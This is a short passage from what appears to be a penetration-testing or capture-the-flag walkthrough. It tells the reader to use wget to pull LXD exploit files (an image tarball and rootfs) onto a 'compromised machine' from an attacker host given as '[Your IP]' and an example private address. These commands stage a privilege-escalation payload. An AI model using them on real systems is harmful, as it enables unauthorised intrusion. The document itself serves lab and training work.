...
- Upload The Files Which Will Be The Exploit For Us In The Compromised Machine By Doing:
 ...
 `wget http://[Your IP]:8000/lxd.tar.xz` [-] For Example: `wget http://192.168.1.5:8000/lxd.tar.xz`
 `wget http://[Your IP]:8000/rootfs.squashfs` [-] For Example: `wget http://192.168.1.5:8000/rootfs.squashfs`
